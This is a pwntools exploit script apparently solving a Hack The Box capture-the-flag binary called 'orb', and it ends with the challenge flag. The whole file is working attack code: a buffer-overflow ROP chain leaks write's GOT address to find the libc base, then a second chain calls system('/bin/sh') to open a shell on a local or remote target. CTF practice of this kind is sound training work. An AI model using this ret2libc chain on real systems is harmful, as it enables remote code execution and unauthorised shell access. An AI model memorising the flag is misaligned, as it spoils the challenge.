from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)
# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
b main
continue
'''.format(**locals())
# Set up pwntools for the correct architecture
exe = './orb'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
libc = ELF('./glibc/libc.so.6')
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'info'
# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
io = start()
offset = 40
padding = b'A' * offset

# useful gadgets
ret = p64(0x0000000000401016)
pop_rdi = p64(0x000000000040127b)
pop_rsi_r15 = p64(0x0000000000401279) 
payload = flat(
    {offset: [
        pop_rsi_r15,
        elf.got.write,
        0x0,
        elf.plt.write,
        elf.symbols.main
    ]}

)

io.sendlineafter(b'Cast spell: ', payload)
print(io.recvline())
print(io.recvline())
print(io.recvline())
io.recv(1)
leaked_addr = io.recv()
got_write = unpack(leaked_addr[:6].ljust(8,b'\x00'))
info("%#x leaked got addr", got_write)

libc.address = got_write - libc.symbols.write
info("libc_base: %#x", libc.address)

# Reset ROP object using libc binary
rop = ROP(libc)

# Call ROP system, and "/bin/sh" string
rop.system(next(libc.search(b'/bin/sh\x00')))

# Final Payload
payload = flat(
    {offset: rop.chain()}
)

io.sendline(payload)
io.sendline(payload)

io.interactive()

'''
HTB{3v3n_th3_gr34t35t_5p3ll5_c4n_br34k}
'''